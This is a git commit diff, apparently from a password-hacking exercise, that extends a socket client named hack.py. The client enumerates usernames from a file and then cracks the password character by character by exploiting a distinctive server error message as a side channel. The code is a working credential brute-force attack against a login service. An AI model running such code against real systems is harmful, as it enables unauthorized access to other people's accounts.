80fa3272efdeeee973e1c3110878a8320571b2a0
fazzkusiak <sactarek@gmail.com>
2022-07-26 17:28:27 +0200

    json bruteforce added

--- bruteforce.py
+++ bruteforce.py
@@ -1,10 +1,12 @@
 import itertools
 import string
+import json
 
 
 def simple_brute_force():
-    all_chars = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9') + tuple(map(str, string.ascii_lowercase))
-    for i in range(4):
+    all_chars = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9') + tuple(map(str, string.ascii_lowercase)) + tuple(map(str, string.ascii_uppercase))
+
+    for i in range(12):
         for j in itertools.product(all_chars, repeat=i):
             yield ''.join(j)
 
@@ -18,4 +20,10 @@ def dictionary_brute_force():
                 yield i
 
 
+def credentials_to_json():
+    dic = {"login": "a", "password": "b"}
 
+    with open('logins.txt') as w:
+       for i in range(25):
+            dic.update({"login": w.readline().strip("\n"), "password": " "})
+            yield json.dumps(dic)
--- hack.py
+++ hack.py
@@ -2,19 +2,41 @@
 import socket
 import sys
 import bruteforce
+import json
 
 def establish_connection(ip, port):
     with socket.socket() as conn:
         address = (ip, int(port))  # port to int cause of int is required
         conn.connect(address)
-        func = bruteforce.dictionary_brute_force()
+        func = bruteforce.credentials_to_json()
+        res = {}
         while True:
             message = next(func)
             conn.send(str(message).encode())
             response = conn.recv(1024)
-            if(response.decode()) == "Connection success!":
-                print(message)
+            if(json.loads(response.decode())["result"]) == "Wrong password!":
+                valid_login = json.loads(message)["login"]
+                a = bruteforce.simple_brute_force()
+                password = ""
+                i = 0
+                while ( i < 63):
+                    curr_pass = next(a)
+                    message = json.dumps({"login": valid_login, "password": password + curr_pass})
+                    conn.send(message.encode())
+                    response = conn.recv(1024)
+                    if (json.loads(response.decode())["result"]) == "Exception happened during login":
+                        i = 0
+                        password += curr_pass
+                        a = bruteforce.simple_brute_force()
+                        curr_pass = next(a)
+                    elif json.loads(response.decode())["result"] == "Connection success!":
+                        password += curr_pass
+                        result = {"login": valid_login, "password": password}
+                        break
+                    else:
+                        i += 1
                 break
+        print(json.dumps(result))
 
 
 def main():
